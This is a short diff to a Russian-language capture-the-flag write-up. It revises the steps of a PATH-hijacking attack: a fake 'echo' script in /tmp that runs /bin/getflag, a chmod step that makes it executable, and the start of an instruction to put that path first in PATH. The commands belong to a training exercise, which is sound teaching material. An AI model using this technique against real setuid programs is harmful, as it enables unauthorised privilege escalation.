@@ -31,7 +31,11 @@ system("/usr/bin/env echo Exploit me"Exploit me\
 Создаем файл echo с необходимым содержимым
 ```
 echo '#!/bin/sh
-> /bin/getflag' > /tmp/echo
+/bin/getflag' > /tmp/echo
+```
+И делаем его исполняемым
+```
+chmod +x /tmp/echo
 ```
 
 Добавляем в начало данный путь
